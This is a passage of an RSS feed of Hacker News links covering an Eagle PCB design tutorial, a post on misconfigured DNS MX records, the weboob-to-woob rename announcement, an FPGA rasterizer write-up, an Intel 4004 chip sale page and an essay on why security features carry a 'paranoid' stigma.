<img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%201.png" alt="/images/how-to-pcb-part-1/Untitled%201.png">
<img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%202.png" alt="/images/how-to-pcb-part-1/Untitled%202.png"></p>

<p>These 3 images represent the stages of any electronics project: Breadboard -&gt; Project Board -&gt; PCB</p>

<p>This project contains 3 different breakout boards and a few through hole components. The brains of the operation are an ESP32 Devkit, there are breakouts for the Thermostat and Screen, and through hold components for the buttons, resistors, and relays.</p>

<h3 id="01-installing-eagle">0.1 Installing Eagle</h3>

<p>For this tutorial I will we be using Eagle. Itâ€™s got a free tier tool that, and it integrates well into the Autodesk suite. Eagle is free for up to two layer boards, which should be all you need for most electronics projects. The information here will be pretty generally applicable to any tool, although the screenshots will be of eagle specifically.</p>

<p>You can download eagle for free <a href="https://www.autodesk.com/products/eagle/overview">here</a></p>

<h2 id="1-anatomy-of-a-pcb-design">1. Anatomy of a PCB Design</h2>

<p>A PCB Design contains two main parts, the schematic and the layout. The schematic is an abstract diagram of the connections between components in your project, and the layout is the actual physical layout of those components, and the electrical traces that connect them. The great thing about PCB design software, is that the schematic will be enforced when you are creating the layout, this makes it very straight forward to create the layout after youâ€™ve created the schematic.</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%203.png" alt="/images/how-to-pcb-part-1/Untitled%203.png"></p>

<p>This is the completed schematic for the caffstat project. You can see all of the breakout boards as individual components (red). The connections between them are mostly being managed by net labels to simplify the schematic (more on this later).</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%204.png" alt="/images/how-to-pcb-part-1/Untitled%204.png"></p>

<p>Here is an image of the completed layout. Every component has found a space on the board, and all of the electrical traces have been drawn. Donâ€™t worry if it looks complicated/messy now, when we go step by step it will be very easy to create.</p>

<h2 id="2-finding-or-creating-component-models">2. Finding or Creating Component Models</h2>

<p>Before you can begin drawing a schematic and layout, you need to find or create models for each and every one of your components. A device model contains both a <strong>symbol</strong> for part (goes in the schematic) and a <strong>footprint</strong> of the part (for the layout). I will list out some great resources for finding or creating these here. I can create a full tutorial for creating your own component models if you are interested, let me know at mdl0394@gmail.com</p>

<p>One thing to note is that Eagle comes pre-packaged with a bunch of common components. These are mostly things like standard resistors/capacitors. Itâ€™s worth checking the pre-installed library before spending too much time scouring the internet. The easiest way to check the library is to use the â€œAdd Partâ€� button discussed in section 3.2 of this tutorial.</p>

<h3 id="21-octopart">2.1. Octopart</h3>

<p>The best tool I have found for looking up components and downloading models is <a href="https://octopart.com/">Octopart</a>. Their mission is to provide the best search engine for electronics components. Almost every part can be found in the search engine, I always check here first.</p>

<p>If octopart has the CAD Model for your part, it will appear like this, you want to download the Eagle format, this will download the library that you can install later.</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%205.png" alt="/images/how-to-pcb-part-1/Untitled%205.png"></p>

<h3 id="22-desparate-googling">2.2. Desparate Googling</h3>

<p>I have also found quite a few schematics by just googling the part. It can often be helpful to try different variations on the name, and include the term â€œEagleâ€� or â€œ.lbrâ€� (Eagle library file extension) in your query. If you do find a schematic, make sure you do some measurements (you can do this on the layout of your design) to ensure it matches well with your part (sometimes people upload bad designs, or are modeling something slightly different than yours, you donâ€™t want to order a PCB with bad footprints)</p>

<h3 id="23-installing-a-library">2.3. Installing a library</h3>

<p>Once you have a library itâ€™s easy to install, drag the Library (.lbr) file into the <code>libraries</code> section of the Eagle Control Panel. <strong>Important:</strong> after dragging the lbr file, make sure you right click and hit â€œUseâ€� otherwise you wonâ€™t actually be able to add it to your project. Libraries in use will have a green dot next to them</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%206.png" alt="/images/how-to-pcb-part-1/Untitled%206.png"></p>

<h3 id="24-creating-your-own-library">2.4. Creating your own Library</h3>

<p>If you fail to find any schematics online (often the case with cheap breakout boards, or with chinese knockoffs) you might have to make your own. Itâ€™s not too hard to make your own models, mostly just a little bit tedious. Creating your own models &amp; libraries is a full tutorial in itself, if I get interest I can put that together, for now I will refer you to the resources I used to learn the process.</p>

<p>A good tutorial on how to make custom eagle components can be found here: <a href="https://www.build-electronic-circuits.com/eagle-components/">https://www.build-electronic-circuits.com/eagle-components/</a></p>

<h2 id="3-creating-your-schematic">3. Creating your Schematic</h2>

<p>Once you have your components, you can start creating your schematic.</p>

<h3 id="31-basic-project-setup">3.1. Basic Project Setup</h3>

<p>First thing is to make a new Project and new Schematic in eagle. Go into the projects section, right click and hit â€œNew Projectâ€�. Then right click and hit â€œNew Schematicâ€�. Once the schematic opens, you also want to create a layout (Weâ€™ll use this in Step 4). Do this by hitting the â€œGenerate/Switch to Boardâ€� button on the top bar.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/6647e677a7889893fc65d08499400076efd2adee/d3801/images/how-to-pcb-part-1/screen_shot_2021-01-18_at_9.26.13_am.png" alt="https://d33wubrfki0l68.cloudfront.net/6647e677a7889893fc65d08499400076efd2adee/d3801/images/how-to-pcb-part-1/screen_shot_2021-01-18_at_9.26.13_am.png"></p>

<h3 id="32-place-your-components">3.2. Place your components</h3>

<p>Once you have a schematic you need to put all of your part symbols on. The add part button is on the left bar, clicking this will bring up a dialogue that lets you choose a component. If you donâ€™t see a component you installed here, go back to the control panel and make sure you selected â€œUseâ€� on the right click menu.</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%207.png" alt="/images/how-to-pcb-part-1/Untitled%207.png"></p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%208.png" alt="/images/how-to-pcb-part-1/Untitled%208.png"></p>

<p>Add all of your components to your schematic. Make sure you give yourself a bunch of room around components to create connections. You should also try to sort the parts in logical groupings, the simpler your schematic, the less likely-hood of bugs.</p>

<p>While placing components there are a few useful tools at your disposal. The Move, Rotate and Copy tools at the top of the left panel are all useful for organizing your schematic. When you want to select an object, the easiest thing to do is to click the + symbol (probably either at the center, or the origin of the part).</p>

<p>Here is what my schematic looks like after I have placed all of my parts.</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%209.png" alt="/images/how-to-pcb-part-1/Untitled%209.png"></p>

<h3 id="33-placing-the-ground-label">3.3. Placing the Ground Label</h3>

<p>The standard for schematics is to use a specialty component to label the shared ground. You can find this by searching â€œgndâ€� in the Add Part menu.</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%2010.png" alt="/images/how-to-pcb-part-1/Untitled%2010.png"></p>

<p>I will usually place one of these per component, just off the bottom of the component, and wire them to the ground pin.</p>

<h2 id="34-wiring-using-labels">3.4. Wiring using Labels</h2>

<p>You can directly connect parts together using the â€œNetâ€� tool (Green line) however with more than a few parts, this will very quickly become unmanageable. Instead of doing that, I will show you how to use labels to cleanly connect parts together. Note that for some components I will not use labels for connections, this makes sense for analog circuits, or things like pull down resistors because they can be logically grouped together.</p>

<p>For every node that I want to connect, I will first draw a one or two unit Net. Like so:</p>

<p><img src="https://www.staycaffeinated.com/images/how-to-pcb-part-1/Untitled%2011.png" alt="/images/how-to-pcb-part-1/Untitled%2011.png"></p>

<p>Then using the â€œNameâ€� tool I will name all of the new nets something that makes them easier to keep track of. To name a net, select the tool, then select the green line for the net, a text dialogue should …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.staycaffeinated.com/2021/02/21/how-to-design-a-motherboard-for-your-project-part-1">https://www.staycaffeinated.com/2021/02/21/how-to-design-a-motherboard-for-your-project-part-1</a></em></p>]]>
            </description>
            <link>https://www.staycaffeinated.com/2021/02/21/how-to-design-a-motherboard-for-your-project-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215270</guid>
            <pubDate>Sun, 21 Feb 2021 17:23:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Please do not put IP addresses into DNS MX records]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 174 (<a href="https://news.ycombinator.com/item?id=26215112">thread link</a>) | @hannob
<br/>
February 21, 2021 | https://blog.hboeck.de/archives/904-Please-do-not-put-IP-addresses-into-DNS-MX-records.html | <a href="https://web.archive.org/web/*/https://blog.hboeck.de/archives/904-Please-do-not-put-IP-addresses-into-DNS-MX-records.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
            <div>
                <!-- s9ymdb:498 --><p><img width="225" height="300" src="https://blog.hboeck.de/uploads/postbox.jpg" alt="Postbox">I want to highlight a common misconfiguration in the DNS records for e-mail servers.<img src="https://ssl-vg03.met.vgwort.de/na/a108fe84457f4d03abf3877bee3dad9f" width="1" height="1" alt=""></p><p>

When a domain is configured to receive mails usually a DNS record of the type MX is configured pointing to the host name of the mail server.</p><p>

Notably, according to the respective <a href="https://tools.ietf.org/html/rfc1035">RFC 1035</a> the MX record must contain a domain name and may not directly point to an IP address. However some mail servers do configure an IP address. Many mail servers are lenient when it comes to this misconfiguration and will deliver mails nevertheless, so this may stay undetected.</p><p>

I happen to use a mail server that is less forgiving (Courier), and every now and then I cannot send a mail due to this. It’s rare, but it does happen. If your mail server has such a configuration you may not receive some legitimate e-mails.</p><p>

So I’m hoping to raise some awareness and get some of those servers fixed.</p><ul><li>Obviously if you run a mail and DNS server please don’t do this and correctly set your MX records.</li><li>If you do any kind of IT service or consulting that is related to mail and DNS servers this is a good thing to add to your list of things to check regularly (here's a <a href="https://github.com/hannob/ipmx">very simple python script you can use</a>).</li><li>If you run any form of service or tool that checks DNS and mail servers for misconfigurations, please add a check for IP addresses in MX records and warn your users. Unfortunately only few services do this currently (thanks to <a href="https://www.hardenize.com/">Hardenize</a> and <a href="https://intodns.com/">IntoDNS</a> who will warn users about this), and some popular services don’t.</li></ul><p>

I did a quick scan of the Alexa Top 1 Million list. Currently <a href="https://github.com/hannob/ipmx/blob/main/scans/ipmx-2021-02-20.txt">around 0,06 % are affected</a> (if you happen to know someone responsible for a host on this list please consider pointing them to this blogpost). I hope by writing this I can reduce that number, I may later try to contact them via their postmaster alias.</p><p>

(<a href="https://nohat.cc/f/post-box-mailbox-letterbox-mail-box-postage/4671034800209920-201811091927.html">Image source: nohat.cc / CC0</a>)
            </p></div>

            
            
            
        </div></div>]]>
            </description>
            <link>https://blog.hboeck.de/archives/904-Please-do-not-put-IP-addresses-into-DNS-MX-records.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215112</guid>
            <pubDate>Sun, 21 Feb 2021 17:07:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Most re-read books and Clojure’s REPL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26214818">thread link</a>) | @nezaj
<br/>
February 21, 2021 | https://www.zeneca.io/blog/most-re-read-books-and-the-repl | <a href="https://web.archive.org/web/*/https://www.zeneca.io/blog/most-re-read-books-and-the-repl">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.zeneca.io/blog/most-re-read-books-and-the-repl</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214818</guid>
            <pubDate>Sun, 21 Feb 2021 16:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Weboob Will Become Woob]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26214663">thread link</a>) | @slooonz
<br/>
February 21, 2021 | https://lists.symlink.me/pipermail/weboob/2021-February/001646.html | <a href="https://web.archive.org/web/*/https://lists.symlink.me/pipermail/weboob/2021-February/001646.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
   
    <b>Romain Bignon</b> 
    <a href="mailto:weboob%40lists.symlink.me?Subject=Re%3A%20%5Bweboob%5D%20Weboob%20will%20become%20woob&amp;In-Reply-To=%3C20210221092437.abaajo4sv7kza5vz%40lesbarbar.es%3E" title="[weboob] Weboob will become woob">romain at weboob.org
       </a><br>
    <i>Sun Feb 21 10:24:37 CET 2021</i>
    <ul>
        
        
         <li> <b>Messages sorted by:</b> 
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/date.html#1646">[ date ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/thread.html#1646">[ thread ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/subject.html#1646">[ subject ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/author.html#1646">[ author ]</a>
         </li>
       </ul>
    <hr>  
<!--beginarticle-->
<pre>Hello,

When weboob was started in 2010, 11 years ago, the name was chosen, without a
hidden agenda, since as a French speaker, "boob" wasn't part of my vocabulary.

Following its release and the ensuing reactions, during its first years, the
project was complemented with various provocative elements (icons, application
names, English slurs in the code). This was done with the sole motive that at
that time, it was seen as "fun".

But in practice, it's been years the project isn't following this approach
anymore, it's used as an essential building block of professional companies, the
provocative elements are progressively removed, and the professionnalisation
question is being raised.

Recently, a notorious weboob contributor has ended his own life and it was later
discovered he had an affinity for far-right pro-conspiracy groups.

The weboob team do not recognize themselves in this extreme ideology, from which
they are very far. It was decided to finally remove remaining items which were
irrelevant to the technical qualities of the weboob project, and which harm the
visibility it deserves.

This raised once more the issue of the project name, which gained some
notoriety, but is still heavily associated to the poor taste jokes typical from
its early years.

This is why it was decided to adopt a neutral and more professional position. To
start again with a clean slate and mark a real turning point, it was also
decided to rename weboob. The chosen name is "woob", since the project could
have been named that way in the first place, and as it's close to the current
name, it's possible to link the two names and still keep the original motto "Web
Outside Of Browsers".

Those changes will be done in the weeks following this announcement, and after
them a new version will be released.

Romain
</pre>

<!--endarticle-->
    <hr>
    <ul>
        <!--threads-->
	
	
         <li> <b>Messages sorted by:</b> 
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/date.html#1646">[ date ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/thread.html#1646">[ thread ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/subject.html#1646">[ subject ]</a>
              <a href="https://lists.symlink.me/pipermail/weboob/2021-February/author.html#1646">[ author ]</a>
         </li>
       </ul>

<hr>
<a href="https://lists.symlink.me/mailman/listinfo/weboob">More information about the weboob
mailing list</a><br>

</div>]]>
            </description>
            <link>https://lists.symlink.me/pipermail/weboob/2021-February/001646.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214663</guid>
            <pubDate>Sun, 21 Feb 2021 16:25:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alice 4 FPGA Rasterizer (Open Hardware Video Card Related)]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26214600">thread link</a>) | @peter_d_sherman
<br/>
February 21, 2021 | https://lkesteloot.github.io/alice/alice4/fpga-rasterizer.html | <a href="https://web.archive.org/web/*/https://lkesteloot.github.io/alice/alice4/fpga-rasterizer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            

            <h2>Overview</h2>

            <p>The Alice 4 rasterizer is broken into two main parts:</p>

            <ul>
                <li>A <a href="https://lkesteloot.github.io/alice/alice4/libgl.html">software library</a> linked with the C application program. The library
                    implements the IrisGL API. It performs transformations, lighting, clipping,
                    and retained mode (display lists). Its output is a list of commands
                    (clear screen, draw triangle, swap buffers, etc.) that it writes to
                    memory outside Linux's range.</li>
                <li>An FPGA configuration that reads these commands from SDRAM and
                    executes them. For triangles it interpolates color (RGB) and depth
                    (Z). The FPGA also scans out the image buffer to the
                    LCD and performs other minor tasks.</li>
            </ul>

            <h2>Buffers</h2>

            <p>There are three image buffers in shared memory:</p>

            <ul>
                <li>A front color buffer, which is displayed to the user via the LCD.
                The scanning is continuous because the LCD has no memory of its own.
                The timing and wire format is similar to VGA.</li>
                <li>A back color buffer, which is being rasterized into.</li>
                <li>A depth buffer, used along with the back buffer during rasterization.</li>
            </ul>

            <p>The first two buffers are only virtually “front” and “back”. Those two
            labels switch every frame as the back buffer becomes the new front
            buffer and is shown to the user.</p>

            <h2>Modules</h2>

            <p>The Verilog code is broken into about a dozen modules:</p>

            <ul>
                <li>Main: Integrates all the other modules.
                    <ul>
                        <li>soc_instance: Module generated by Qsys to interface with
                            SDRAM and I<sup>2</sup>C.</li>
                        <li>LCD_control: Generates LCD control signals (H-Sync, V-Sync,
                            pixel enable, next frame signal, X coordinate, Y coordinate).
                            This runs at 25&nbsp;MHz (about 50&nbsp;FPS). It could run faster (up to 40&nbsp;MHz)
                            but the board clock is 50&nbsp;MHz, so it was convenient to
                            divide that by two and avoid having asynchronous clocks.</li>
                        <li>LCD_text: Given screen pixel X and Y, returns character X and Y
                            (text column and row) and sub-character X and Y.</li>
                        <li>LCD_debug: Given character X and Y and three 32-bit debug values,
                            returns which character to draw.
                            <ul>
                                <li>Binary_to_hex: Converts a nybble to a hex
                                    ASCII value. Used for each nybble of the
                                    debug values to generate hex output.</li>
                            </ul>
                        </li>
                        <li>Frame_buffer: Sends the front frame buffer to the LCD.</li>
                        <li>LCD_font: Given ASCII character and sub-character X and Y,
                            returns whether the pixel is on or off.
                            <ul>
                                <li>Font_ROM: The font pixels.</li>
                            </ul>
                        </li>
                        <li>Command_reader: Pre-fetches drawing commands from
                            SDRAM into a FIFO.</li>
                        <li>Rasterizer: Reads drawing commands and executes them.
                            <ul>
                                <li>Read_FIFO: Queues rasterized pixels,
                                    waiting for Z read to complete.</li>
                                <li>Write_FIFO: Queues rasterized and Z-compared
                                    pixels, waiting for pixel writes to complete.
                                    See the “Write FIFO” section below for more details.</li>
                            </ul>
                        </li>
                        <li>Prescaler: Generates a tick every N clocks.</li>
                        <li>PWM: Generates a PWM signal for LCD backlight brightness.</li>
                        <li>Debouncer: Debounces the Home button.</li>
                    </ul>
                </li>
            </ul>

            <h2>Memory controller</h2>

            <p>The Altera Cyclone V SoC has a wonderful memory controller for accessing
            the synchronous dynamic RAM (SDRAM). It has a port for the ARM and six ports
            for the FPGA. Each FPGA port can be configured for input or output, and their
            relative priorities (including the ARM port) can be set. The priorities were
            critical for making sure the front-buffer scan-out was never starved of
            pixels. The SDRAM itself ran so fast (400&nbsp;MHz DDR) that all the ports could
            be active and not stall too often. The ports were set up as follows:</p>

            <ul>
                <li>Reading the front-buffer for LCD scan-out. This was configured
                to be the highest priority.</li>
                <li>Reading the graphics command buffer.</li>
                <li>Reading the depth buffer for the pixel being rasterized.</li>
                <li>Writing the color of the pixel just rasterized.</li>
                <li>Writing the depth of the pixel just rasterized.</li>
            </ul>

            <p>All five ports were hooked up to FIFOs to minimize the effects of
            memory latency.</p>

            <h2>Rasterization</h2>

            <p>Rasterization uses the edge-equation technique. The idea is to test every
            pixel to see whether it's inside the triangle. “Inside” is defined as “on the
            same side of every edge”. Only pixels in the bounding box of the triangle are
            tested. This technique wastes at least 50% of its time on pixels outside the
            triangle, but it's simpler to implement than edge-walkers.</p>

            <p>The state machine in <tt>Rasterizer.v</tt> reads commands from SDRAM
            (indirectly through the FIFO) and executes them. Because the SDRAM interface
            is (logically) 64 bits wide, and each pixel takes 32 bits (8 bits each of
            red, green, and blue, with 8 bits wasted), we always rasterize two pixels
            at a time. At 50&nbsp;MHz, that's 100 million pixels per second, but with (at least)
            half of them wasted, that's at most 50 million drawn pixels per second.</p>

            <p>To minimize SDRAM latency stalls, we use three FIFOs in the rasterization
            process:</p>
            
            <ul>
                <li>The Command FIFO queues the drawing commands so that the
                    state machine need not block too long.</li>
                <li>The Read FIFO queues drawn pixels while we wait for the
                    depth read to return. After determining that a pixel is
                    inside the triangle, we initiate a read of its
                    corresponding depth value (if depth-comparison is enabled
                    for this triangle). This can take some time (tens of clocks) and we don't
                    want to block the rasterizer. Instead, we queue up all the
                    information we have about this pixel (depth memory address,
                    depth value, color memory address, and color) and move on to the
                    next pixel.
                    Another module (<tt>Read_FIFO.v</tt>) waits for the SDRAM read
                    to return. Since SDRAM reads return in the order they were
                    made, the module then gets the next item in our FIFO,
                    compares the depth values, and if the new pixel is closer to
                    the camera than the existing pixel, enqueues the same pixel
                    information into the Write FIFO. (All of this is done two
                    pixels at a time.)</li>
                <li>The Write FIFO queues pixels that must be written back to SDRAM.
                    The pixel's color must be written, and optionally the depth value
                    must be written (if enabled for this triangle). This is a complicated
                    module because we must take into account whether there are pixels
                    in the FIFO to write, whether the depth memory controller is ready
                    to accept another write, and whether the color memory controller is
                    ready to accept another write. See the section “Write FIFO” below
                    for details.</li>
            </ul>

            <p>There's very little stalling in this pipeline, so we end up with a
            rasterization rate of about 50 million Gouraud (color-interpolated)
            Z-buffered pixels per second. The triangle overhead lets us do
            almost 2 million (empty) triangles per second. It's hard to compare
            these numbers to
            <a href="http://www.sgidepot.co.uk/gfxtables.html">real SGI machines</a>, 
            but we seem to be matching the performance of machines built in the
            early 1990s.</p>

            <h2>Reciprocal</h2>

            <p>For each triangle, the rasterizer computes its on-screen area, then takes
            the reciprocal of the area. This is necessary for the normalization of
            the barycentric coordinates used to interpolate color and depth.
            <a href="https://www.scratchapixel.com/lessons/3d-basic-rendering/rasterization-practical-implementation/rasterization-stage">Scratchapixel</a> has a great explanation
            of how this works; scroll down to the “Barycentric Coordinates” section.</p>

            <p>To compute the reciprocal we use the built-in
            <a href="https://www.altera.com/en_US/pdfs/literature/ug/ug_lpm_alt_mfug.pdf"><tt>lpm_divide</tt></a> module:</p>

            <pre>lpm_divide
    #(.LPM_WIDTHN(32),
      .LPM_WIDTHD(32),
      .LPM_NREPRESENTATION("UNSIGNED"),
      .LPM_DREPRESENTATION("SIGNED"),
      .LPM_PIPELINE(6)) area_divider(
        .clock(clock),
        .clken(area_reciprocal_enabled),
        .numer(32'h7FFF_FFFF),
        .denom(tri_area),
        .quotient(tri_area_recip_result)
    );
            </pre>

            <p>The module is configured to have six pipeline stages, which means that
            the result will come out six clocks after the denominator was put in.
            We don't pipeline (overlap) our reciprocals (we only need one per triangle), but our
            state machine must wait six clocks for this result. We found the
            number 6 by trying various values until the compiler stopped complaining
            about timing violations.</p>

            <h2>Write FIFO</h2>

            <p>The Write FIFO, which writes pixel data to the back color buffer and
            to the depth buffer, was one of the most difficult modules to write in
            this project. Conceptually the state machine should perform these
            steps in a loop:</p>

            <ol>
                <li>Wait for a new pixel to be available in the Write FIFO.</li>
                <li>Write it to the back color buffer and to the depth buffer.</li>
                <li>Wait for both SDRAM controller ports to acknowledge that they had
                    accepted the writes.</li>
            </ol>

            <p>Remember that wherever we talk about “a pixel” here, we mean two
  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lkesteloot.github.io/alice/alice4/fpga-rasterizer.html">https://lkesteloot.github.io/alice/alice4/fpga-rasterizer.html</a></em></p>]]>
            </description>
            <link>https://lkesteloot.github.io/alice/alice4/fpga-rasterizer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214600</guid>
            <pubDate>Sun, 21 Feb 2021 16:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intel 4004 Chips and Artwork for Sale]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26214425">thread link</a>) | @Stregone
<br/>
February 21, 2021 | https://chipscapes.com/collections/the-intel-4004-the-first-microprocessor-50th-anniversary | <a href="https://web.archive.org/web/*/https://chipscapes.com/collections/the-intel-4004-the-first-microprocessor-50th-anniversary">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>This year, 2021, is the 50th anniversary of the first single-chip microprocessor's invention, the Intel 4004. The official birthday of the 4004 was November 15th, 1971, when it was announced to the public. There are other pretenders to the throne, but only the 4004 meets all of the key criteria to be considered the first. I offer multiple ways to become a proud owner of a fully-functional, genuine, new Intel 4004 microprocessor.</p>
<p>I offer two ways to acquire an Intel 4004. The first way is that I incorporate an Intel 4004 chip into an artwork, called a ChipScape. These ChipScape artworks have an image of the tiny 4004 chip itself and have technical information about 4004 and its creation story. I offer different styles to appeal to different interests, price points, and artistic tastes. These make great gifts for anyone who has an interest in computer technology.</p>
<p>The second way is&nbsp;that I offer just the chips. Here you have two choices: the Intel P4004 and the Intel D4004. Both types have the same chip on the inside, but their packaging is different. The P4004 is made from a black plastic resin and is the more "common" version available. Within the P4004, I offer different date codes (when this chip was made, the earlier, the more valuable) and different manufacturing locations (where the chip was made, this is purely a collector preference). The D4004 is made using a gray ceramic package. It was made to be more rugged and is much rarer.</p>
<p>I get lots of questions about the C4004. I don't have any of the C4004s available as chips, just in artworks (only a couple). C4004s are made with white ceramic and gold plated leads and caps. They are rare. Prices for&nbsp;good working versions can range from $1,000 to $5,000.</p>
        </div></div>]]>
            </description>
            <link>https://chipscapes.com/collections/the-intel-4004-the-first-microprocessor-50th-anniversary</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214425</guid>
            <pubDate>Sun, 21 Feb 2021 16:02:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The paranoia-disaffiliation hypothesis: How shady geeks put others off security]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26214353">thread link</a>) | @sdas7
<br/>
February 21, 2021 | https://consult.sauvik.me/posts/paranoia-disaffiliation-hypothesis/ | <a href="https://web.archive.org/web/*/https://consult.sauvik.me/posts/paranoia-disaffiliation-hypothesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Like most who entered college in the mid-aughts, I was taken by Facebook. It had a sleek interface. All my friends from high school and college were on it, being super cool with edgy profile pics. I browsed my newsfeed everyday — probably for years. But, starting the early 2010s, I noticed an inverse correlation. The more friend requests I received from long lost aunties and uncles, the fewer posts I would see from my peers. It was almost like the aunties and uncles were driving them away.</p><p><img data-src="/assets/post-images/facebook-mom.jpg" alt="Facebook friended by mom" src="https://consult.sauvik.me/assets/post-images/facebook-mom.jpg"></p><p>There’s a concept in social psychology known as an illusory correlation <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Illusory correlations are sort of like stereotypes for relationships between two variables — if enough of a certain type of person does activity X or uses thing Y, then other people start to associate activity X or thing Y as being only for that certain type of person. More concretely, if enough aunties and uncles seem to use Facebook (relative to other demographics), then non-aunties-and-uncles start thinking that Facebook must only be for aunties and uncle. At best, the correlation is silly; at worst, it is pernicious. Whatever it is, its effects are often unconscious and real.</p><p>Now, I want you to close your eyes and think about the first person who comes to mind when you think about the attribute “security conscious” or “concerned about privacy”. Readers of this blog may be biased; but, for many non-experts, the person they think about may look something like this:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fi.imgur.com%2FiVHfwLc.gif&amp;f=1&amp;nofb=1" alt="Printer Hacker"></p><p>And therein lies the illusory correlation in consumer security.</p><p>If you’ll allow me a moment to be more formal: early adopters of security and privacy features are usually those who are especially concerned about security and privacy. Perhaps this is because they genuinely have some sensitive information to keep away from prying eyes. Perhaps they are simply risk averse. Whatever the reason, many non-experts describe these early adopters and security experts more generally as “nutty” or “paranoid”. A classic example of this comes from Shirley Gaw and colleagues study on encrypted email usage in the workplace <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. The authors found that if someone used encrypted email but did not have a “good” reason for doing so (e.g., if they were only asking about lunch), they were perceived by their colleagues as being “paranoid.” I found something similar in my own research <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>: experts felt hesitant about sharing security advice with non-experts to avoid being perceived as “nutty”. The upshot? If only “nutty” or “paranoid” people use security features, and <em>I</em> am not nutty or paranoid…well, those security or privacy features must not be for me.</p><p>In short, early adopters of security features may —&nbsp;subtly or overtly — be perceived as paranoid by others; in turn, this stigma can cause non-experts to “disaffiliate” from security. This is what I call the paranoia-disaffiliation hypothesis in end-user security. I call it a hypothesis because it has not been tested it in a randomized, controlled experiment <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>; but, there is a good bit of observational evidence to back it up.</p><p>When I worked at Facebook, for example, I ran an analysis of how one’s friends use of security features like two-factor authentication affected one’s own use of two-factor authentication <sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. I found a surprising effect: for the vast majority of people, social influence appeared to have a <em>negative</em> effect on one’s own adoption of two-factor authentication. In other words, for the vast majority of people, the presence of N friends who used two-factor authentication made them less likely to use two-factor authentication than if they had fewer than N friends who used two-factor authentication.</p><p>This is a surprising result. Typically, social “proof” tends to have a positive effect —&nbsp;if more of my friends use X, I should be more likely to use X myself. But, my research suggests that this more “typical” effect of social influence does not come to fruition for typical security tools until many of one’s friends start using security tools (e.g., as demonstrated by the recent WhatsApp exodus to Signal). Social influence for security behaviors is sort of like quantum mechanics in physics: the rules that apply at large scale do not apply at small scale.</p><p>So what can we do? My research suggests that one of the key drivers of the paranoia-disaffiliation hypothesis is the unfounded assumption that only geeks use security features. This image of the shady security geek is pernicious, and has been amplified by popular depictions of “hackers”. We also happen to live in a culture that values openness and transparency —&nbsp;”I’ve Got Nothing to Hide”, tired as it is as an argument against privacy, is seen as a badge of honor. But this notion of privacy and security being only for shady geeks is dangerous, and does more harm than good.</p><p>There is hope, though. My research suggests that the paranoia-disaffiliation hypothesis does <em>not</em> hold for security and privacy systems that are designed to be more social: i.e., those that can be easily observed when used, that involve others in the process of providing security, or that allow us to act in benefit of others. By making security and privacy more social, we start to associate security and privacy with more desirable social properties — e.g., altruism, leadership, and responsibility. And if people stop viewing the security conscious as shady geeks, and start viewing them as altruistic leaders, perhaps we can overcome the 